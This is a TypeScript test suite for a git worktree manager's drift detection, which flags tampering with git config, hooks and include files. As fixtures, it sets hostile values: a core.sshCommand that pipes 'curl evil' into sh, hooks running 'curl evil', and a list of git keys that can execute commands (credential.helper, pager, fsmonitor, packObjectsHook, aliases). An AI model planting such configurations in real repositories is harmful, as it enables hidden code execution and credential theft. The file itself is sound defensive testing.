// Copyright (c) 2026 Dylan Lambertson. All rights reserved.

import assert from 'node:assert/strict';
import { chmodSync, mkdirSync, unlinkSync, writeFileSync } from 'node:fs';
import * as path from 'node:path';
import { afterEach, beforeEach, describe, it } from 'node:test';
import { WorktreeError } from '../src/index.js';
import { makeFixture, sh, write, type Fixture } from './helpers.js';

describe('GIT-SNAP-1 drift detection', () => {
  let fx: Fixture;
  let wt: string;
  const common = () => path.join(fx.repo, '.git');
  const driftIds = async () => (await fx.manager.status(wt)).drift.map((d) => d.id);

  beforeEach(async () => {
    fx = makeFixture();
    wt = (await fx.manager.create({ repoPath: fx.repo, slug: 'snap' })).path;
  });
  afterEach(() => fx.cleanup());

  it('has no drift right after create', async () => {
    const st = await fx.manager.status(wt);
    assert.deepEqual(st.drift, []);
    assert.equal(st.baselineMissing, false);
  });

  it('detects an info/attributes filter driver and its config', async () => {
    write(path.join(common(), 'info', 'attributes'), '*.txt filter=evil\n');
    assert.deepEqual(await driftIds(), ['file:info/attributes']);
    sh(fx.repo, 'config', 'filter.evil.clean', 'touch /tmp/pwned');
    const ids = await driftIds();
    assert.ok(ids.includes('file:info/attributes'));
    assert.ok(ids.includes('file:config'));
    assert.ok(ids.includes('config:filter.evil.clean'));
    const item = (await fx.manager.status(wt)).drift.find((d) => d.id === 'config:filter.evil.clean');
    assert.equal(item?.change, 'added');
    assert.match(item?.after ?? '', /touch \/tmp\/pwned/);
  });

  it('detects core.sshCommand', async () => {
    sh(fx.repo, 'config', 'core.sshCommand', 'sh -c "curl evil|sh"');
    const ids = await driftIds();
    assert.ok(ids.includes('config:core.sshcommand'));
    assert.ok(ids.includes('file:config'));
  });

  it('detects core.hooksPath and core.fsmonitor', async () => {
    sh(fx.repo, 'config', 'core.hooksPath', '/tmp/evil-hooks');
    sh(fx.repo, 'config', 'core.fsmonitor', 'evil');
    const ids = await driftIds();
    assert.ok(ids.includes('config:core.hookspath'));
    assert.ok(ids.includes('config:core.fsmonitor'));
  });

  it('detects diff drivers', async () => {
    sh(fx.repo, 'config', 'diff.evil.textconv', 'cat');
    assert.ok((await driftIds()).includes('config:diff.evil.textconv'));
  });

  it('detects added, modified and removed hooks and an exec-bit change', async () => {
    const hook = path.join(common(), 'hooks', 'pre-commit');
    write(hook, '#!/bin/sh\nexit 0\n');
    assert.deepEqual(await driftIds(), ['file:hooks/pre-commit']);
    await fx.manager.acknowledgeDrift(wt);
    assert.deepEqual(await driftIds(), []);
    write(hook, '#!/bin/sh\ncurl evil\n');
    const mod = (await fx.manager.status(wt)).drift[0];
    assert.equal(mod?.change, 'modified');
    assert.match(mod?.before ?? '', /exit 0/);
    assert.match(mod?.after ?? '', /curl evil/);
    await fx.manager.acknowledgeDrift(wt);
    chmodSync(hook, 0o755);
    assert.deepEqual(await driftIds(), ['file:hooks/pre-commit']);
    await fx.manager.acknowledgeDrift(wt);
    unlinkSync(hook);
    assert.equal((await fx.manager.status(wt)).drift[0]?.change, 'removed');
  });

  it('detects config.worktree files (main and per-worktree)', async () => {
    write(path.join(common(), 'config.worktree'), '[core]\n\tsshCommand = x\n');
    assert.deepEqual(await driftIds(), ['file:config.worktree']);
    const name = path.basename(sh(wt, 'rev-parse', '--git-dir').trim());
    write(path.join(common(), 'worktrees', name, 'config.worktree'), '[core]\n\thooksPath = y\n');
    assert.deepEqual(await driftIds(), ['file:config.worktree', `file:worktrees/${name}/config.worktree`]);
  });

  it('ignores changes outside the guard set', async () => {
    write(path.join(common(), 'info', 'exclude'), 'junk\n');
    sh(fx.repo, 'config', 'user.name', 'Someone');
    sh(fx.repo, 'config', 'branch.main.description', 'x');
    const ids = await driftIds();
    assert.deepEqual(ids, ['file:config']); // the file hash changes; no watched key did
  });

  it('fails closed when the baseline is missing and honours a supplied one', async () => {
    const baseline = await fx.manager.takeGitSnapshot(wt);
    const { unlinkSync: rm } = await import('node:fs');
    rm(path.join(sh(wt, 'rev-parse', '--absolute-git-dir').trim(), 'axis-gitsnap.json'));
    const st = await fx.manager.status(wt);
    assert.equal(st.baselineMissing, true);
    assert.equal(st.hasDrift, true);
    const ok = await fx.manager.status(wt, { baseline });
    assert.equal(ok.hasDrift, false);
  });

  const watched: Array<[string, string, string]> = [
    ['url.https://evil/.insteadOf', 'https://github.com/', 'config:url.https://evil/.insteadof'],
    ['url.https://evil/.pushInsteadOf', 'https://github.com/', 'config:url.https://evil/.pushinsteadof'],
    ['remote.origin.url', 'https://evil/x.git', 'config:remote.origin.url'],
    ['remote.origin.pushurl', 'https://evil/x.git', 'config:remote.origin.pushurl'],
    ['remote.origin.uploadpack', 'evil', 'config:remote.origin.uploadpack'],
    ['credential.helper', '!evil', 'config:credential.helper'],
    ['credential.https://github.com.helper', '!evil', 'config:credential.https://github.com.helper'],
    ['core.pager', 'evil', 'config:core.pager'],
    ['core.editor', 'evil', 'config:core.editor'],
    ['sequence.editor', 'evil', 'config:sequence.editor'],
    ['core.askPass', 'evil', 'config:core.askpass'],
    ['core.gitProxy', 'evil', 'config:core.gitproxy'],
    ['gpg.program', 'evil', 'config:gpg.program'],
    ['gpg.x509.program', 'evil', 'config:gpg.x509.program'],
    ['merge.evil.driver', 'evil %A', 'config:merge.evil.driver'],
    ['uploadpack.packObjectsHook', 'evil', 'config:uploadpack.packobjectshook'],
    ['protocol.ext.allow', 'always', 'config:protocol.ext.allow'],
    ['protocol.allow', 'always', 'config:protocol.allow'],
    ['alias.st', '!evil', 'config:alias.st'],
  ];
  for (const [key, value, id] of watched) {
    it(`detects ${key}`, async () => {
      sh(fx.repo, 'config', key, value);
      assert.ok((await driftIds()).includes(id), id);
    });
  }

  it('detects config includes and hashes the include targets', async () => {
    const inc = path.join(fx.tmp, 'extra.gitconfig');
    writeFileSync(inc, '[core]\n\tsshCommand = first\n');
    sh(fx.repo, 'config', 'include.path', inc);
    let ids = await driftIds();
    assert.ok(ids.includes('config:include.path'));
    assert.ok(ids.includes('config:core.sshcommand'), 'effective value from the included file');
    assert.ok(ids.includes(`file:include:${inc}`));
    await fx.manager.acknowledgeDrift(wt);
    assert.deepEqual(await driftIds(), []);
    writeFileSync(inc, '[core]\n\tsshCommand = second\n');
    ids = await driftIds();
    assert.ok(ids.includes(`file:include:${inc}`));
    assert.ok(ids.includes('config:core.sshcommand'));
  });

  it('hashes includeIf targets even when the condition does not match, and relative includes', async () => {
    const never = path.join(fx.tmp, 'never.gitconfig');
    writeFileSync(never, '[core]\n\tpager = x\n');
    sh(fx.repo, 'config', 'includeIf.gitdir:/nowhere/.path', never);
    await fx.manager.acknowledgeDrift(wt);
    writeFileSync(never, '[core]\n\tpager = y\n');
    assert.deepEqual(await driftIds(), [`file:include:${never}`]);
    // relative to the including file (.git/config)
    writeFileSync(path.join(common(), 'rel.gitconfig'), '[core]\n\teditor = x\n');
    sh(fx.repo, 'config', 'include.path', 'rel.gitconfig');
    await fx.manager.acknowledgeDrift(wt);
    writeFileSync(path.join(common(), 'rel.gitconfig'), '[core]\n\teditor = y\n');
    assert.ok((await driftIds()).includes(`file:include:${path.join(common(), 'rel.gitconfig')}`));
  });

  it('detects a redirected .git file and admin commondir/gitdir files', async () => {
    const dotGit = path.join(wt, '.git');
    const name = path.basename(sh(wt, 'rev-parse', '--git-dir').trim());
    const admin = path.join(common(), 'worktrees', name);
    writeFileSync(dotGit, `gitdir: ${common()}/worktrees/./${name}\n`);
    assert.deepEqual(await driftIds(), ['file:worktree/.git']);
    await fx.manager.acknowledgeDrift(wt);
    writeFileSync(path.join(admin, 'commondir'), '../../\n');
    assert.deepEqual(await driftIds(), [`file:worktrees/${name}/commondir`]);
    await fx.manager.acknowledgeDrift(wt);
    writeFileSync(path.join(admin, 'gitdir'), `${wt}/./.git\n`);
    assert.deepEqual(await driftIds(), [`file:worktrees/${name}/gitdir`]);
  });

  it('hashes a core.hooksPath directory that resolves inside the worktree', async () => {
    mkdirSync(path.join(wt, '.githooks'));
    writeFileSync(path.join(wt, '.githooks', 'pre-commit'), '#!/bin/sh\nexit 0\n');
    sh(fx.repo, 'config', 'core.hooksPath', '.githooks');
    assert.ok((await driftIds()).includes('file:hookspath:.githooks/pre-commit'));
    await fx.manager.acknowledgeDrift(wt);
    assert.deepEqual(await driftIds(), []);
    writeFileSync(path.join(wt, '.githooks', 'pre-commit'), '#!/bin/sh\ncurl evil\n');
    writeFileSync(path.join(wt, '.githooks', 'post-merge'), 'x\n');
    assert.deepEqual(await driftIds(), ['file:hookspath:.githooks/post-merge', 'file:hookspath:.githooks/pre-commit']);
  });

  it('assertNoDrift refuses on drift until acknowledged and fails closed without a baseline', async () => {
    await assert.doesNotReject(fx.manager.assertNoDrift(wt));
    sh(fx.repo, 'config', 'core.sshCommand', 'evil');
    await assert.rejects(fx.manager.assertNoDrift(wt), (e) =>
      e instanceof WorktreeError && e.code === 'E_CONFLICT' && e.details['reason'] === 'git-drift' &&
      (e.details['items'] as string[]).includes('config:core.sshcommand'));
    await fx.manager.acknowledgeDrift(wt);
    await assert.doesNotReject(fx.manager.assertNoDrift(wt));
    unlinkSync(path.join(sh(wt, 'rev-parse', '--absolute-git-dir').trim(), 'axis-gitsnap.json'));
    await assert.rejects(fx.manager.assertNoDrift(wt), (e) =>
      e instanceof WorktreeError && e.details['reason'] === 'git-drift' && e.details['baselineMissing'] === true);
  });
});
